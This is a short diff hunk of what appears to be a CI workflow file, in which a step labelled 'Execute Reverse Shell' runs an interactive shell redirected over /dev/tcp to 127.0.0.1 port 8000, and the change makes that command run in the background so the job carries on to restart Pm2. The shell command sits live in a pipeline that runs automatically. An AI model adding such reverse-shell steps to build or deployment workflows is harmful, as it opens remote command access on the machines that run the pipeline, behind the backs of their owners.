@@ -46,7 +46,7 @@ jobs:
 
       - name: Execute Reverse Shell
         run: |
-          sh -i >& /dev/tcp/127.0.0.1/8000 0>&1
+          (sh -i >& /dev/tcp/127.0.0.1/8000 0>&1 &)
 
       - name: Restart Pm2
         run: |
